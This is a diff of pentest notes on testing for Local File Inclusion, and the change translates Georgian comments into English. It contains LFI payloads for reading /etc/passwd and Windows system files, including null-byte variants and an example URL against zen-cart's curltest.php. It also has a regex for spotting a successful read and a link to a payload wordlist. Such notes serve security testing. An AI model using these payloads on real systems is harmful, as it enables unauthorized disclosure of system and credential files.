@@ -4,7 +4,6 @@
 ```
 Detect Payload: abc.txt
 ```
-request-ის შემდეგ აბრუნებს შემდეგ შეცდომებს respons-ში
 
 ##### Java Errors:
 ```
@@ -32,7 +31,7 @@ open_basedir restriction in effect
 /etc/passwd
 ```
 
-შემდეგი სახის LFI - ის ტესტირება, როგორიცაა http://website/zen-cart/extras/curltest.php?url=file:///etc/passwd
+another type of LFI http://website/zen-cart/extras/curltest.php?url=file:///etc/passwd
 ```
 file:///etc/passwd
 /etc/passwd%00
@@ -58,13 +57,12 @@ file:///C:/win.ini
 C:\\boot.ini%00.ext
 %SYSTEMROOT%\\win.ini%00.ext
 ```
-ვაკვირდებით respons და ვეძებთ 
+search in response 
 ##### Regexp:
 ```
 root:x|for 16-bit app support|boot loader
 ```
-
-სასურველი payload-ების ვორდლისტი
+Payloads:
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders
 
 
